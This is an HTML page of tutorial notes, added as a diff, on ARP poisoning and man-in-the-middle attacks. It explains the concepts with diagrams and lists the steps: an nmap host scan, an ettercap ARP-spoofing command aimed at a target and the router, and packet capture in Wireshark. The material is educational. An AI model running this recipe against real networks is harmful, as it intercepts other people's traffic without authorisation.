@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+    <meta content="utf-8" http-equiv="encoding">
+    <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <meta name="viewport" content="width=device-width; initial-scale=1.0">
+    <style>
+      body{background-color:black;color:white;height:100%;font-family:Arial,Helvetica,sans-serif;}
+      /*h3{color:#00ff2b}*/
+      a{color:#337AB7;font-weight:bold;text-decoration:none;}
+      pre code {
+        color:white;
+        border: 1px solid #999;
+        display: block;
+        padding: 5px 10px;
+        white-space:pre-wrap;
+        word-wrap:break-word;
+
+      }
+      table{width:100%}
+      td,tr,th{border:1px solid white;}
+      td,th{width:25%;}
+      div.formula{overflow-x:scroll;border:1px solid white;}
+    ::-webkit-scrollbar {
+        width: 5px;
+    }
+
+    /* Track */
+    ::-webkit-scrollbar-track {
+        width:5px;
+        -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3);
+        -webkit-border-radius: 10px;
+        border-radius: 10px;
+    }
+
+    /* Handle */
+    ::-webkit-scrollbar-thumb {
+        -webkit-border-radius: 10px;
+        width:5px;
+        border-radius: 10px;
+        background: #555;
+        -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.5);
+    }
+
+    /* Handle on hover */
+    ::-webkit-scrollbar-track:hover {
+        width:5px;
+        background: #555;
+    }
+
+    ::-webkit-scrollbar-thumb:hover {
+        width:5px;
+        background: orange;
+    }
+
+    /* Handle on hover */
+    ::-webkit-scrollbar-track:active {
+        width:5px;
+        background: #555;
+    }
+
+    </style>
+    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+</head>
+<body class="content wrapper">
+    <div style="background-color:black; color:white; padding:0 2% 0 2%; height: 100%; flex:1;overflow: auto;">
+
+    <h3>MiTM Attack</h3>
+    <hr>
+    <h4>Installations</h4>
+    <pre><code>
+sudo apt install wireshark
+sudo apt install nmap
+sudo apt install ettercap-text-only
+    </code></pre>
+
+    <h4>Theories</h4>
+    <h5>Old Router Communication Method</h5>
+    <div class="mermaid" style="background-color:white; max-width:80vw">
+    flowchart LR
+        Z((Internet)) -->|Laptop Msg| A(Router);
+        A -->|Laptop Msg| B[Laptop];
+        A -->|Laptop Msg| C[Phone];
+        A -->|Laptop Msg| D[Raspi];
+        subgraph "Hub"
+        A;
+        end
+    </div>
+    <p>This old communication method is easy to hack, since it sends the every message with different distinations to everyone. Sniffing (capturing) network traffic thus was easy at the past.</p>
+
+    <h5>Communication with MAC addresses</h5>
+    <div class="mermaid" style="background-color:white; max-width:80vw">
+    flowchart LR
+        Z((Internet)) -->|Laptop Msg| A(Router);
+        A --- C[Phone];
+
+        subgraph "Hub, Wireless Access Point"
+        
+        subgraph "MAC filtering"
+        A -->|Laptop Msg| B[Laptop];
+        end
+
+        end
+    </div>
+
+
+    <h4>ARP Poisoning and MiTM attack</h4>
+    <ul>
+    <li>Address Resolution Protocol (ARP) is a procedure for mapping a dynamic Internet Protocol address (IP address) to a permanent physical machine address in a local area network (LAN). The physical machine address is also known as a Media Access Control or MAC address. </li>
+    <li>Man-in-the-middle Attack (MiTM)</li>
+    <li>Sniffing is the process of monitoring and capturing all the packets passing through a given network using sniffing tools.</li>
+    </ul>
+    <p>Originally,</p>
+    <div class="mermaid" style="background-color:white; max-width:80vw">
+    flowchart LR
+        A(Router) -->|"msg \n private ip: 192.168.x.5 \n mac: ABCD"| B[Victim];
+        B -->|"request \n private ip: 192.168.x.1 \n mac: AAAA"| A;
+        subgraph "ip: 192.168.x.1 \n mac: AAAA"
+        A
+        end
+        subgraph "ip: 192.168.x.5 \n mac: ABCD"
+        B
+        end
+    </div>
+
+    <p>After MiTM Attack,</p>
+    <div class="mermaid" style="background-color:white; max-width:80vw">
+    flowchart LR
+        A(Router) -->|"msg \n private ip: 192.168.x.5 \n mac: BBBB"| C[Hacker];
+        C -->|"msg \n private ip: 192.168.x.5 \n mac: ABCD"| B[Victim];
+        subgraph "ip: 192.168.x.1 \n mac: AAAA"
+        A
+        end
+        subgraph "ip: 192.168.x.5 \n mac: ABCD"
+        B
+        end
+        subgraph "ip: 192.168.x.10 \n mac: BBBB"
+        C
+        end
+        B -->|"request \n private ip: 192.168.x.1 \n mac: BBBB"| C;
+        C -->|"request \n private ip: 192.168.x.1 \n mac: AAAA"| A;
+
+    </div>
+
+    <h4>Steps</h4>
+    <ol>
+    <li>Identify Victim MAC Address and IP Address.</li>
+    <pre><code>
+nmap -sn 192.168.1.0/24
+    </code></pre>
+    <li>Swap addresses.</li>
+    <pre><code>
+sudo ettercap -T -S -i wlan0 -M arp:remote /192.168.1.1// /target_ip//
+    </code></pre>
+    <li>Turn on WireShark to see captured packets. Click on wlan0 &#8594 Filter display ip "ip.addr == target ip"</li>
+    <pre><code>
+sudo wireshark
+    </code></pre>
+    <li></li>
+    <pre><code>
+    </code></pre>
+    </ol>
+
+
+
+    <h3>References</h3>
+    <hr>
+    <ol>
+    <li><a href="https://www.makeuseof.com/tag/ip-mac-address/">Understanding IP and MAC Addresses: What Are They Good For?</a></li>
+    <li><a href="https://searchnetworking.techtarget.com/definition/Address-Resolution-Protocol-ARP">Address Resolution Protocol (ARP) </a></li>
+    <li><a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">Wiki -- Man-in-the-middle attack</a></li>
+    <li><a href="https://www.tutorialspoint.com/ethical_hacking/ethical_hacking_sniffing.htm">Ethical Hacking - Sniffing</a></li>
+    <li><a href=""></a></li>
+    </ol>
+
+
+
+
+    </div>
+    <script type="text/javascript" async
+      src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML">
+    </script>
+    <script type="text/javascript" src="https://zcemycl.github.io/static/eqresp.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+    <script>mermaid.initialize({startOnLoad:true});</script>
+    <script>
+    </script>
+    
+</body>
+</html>
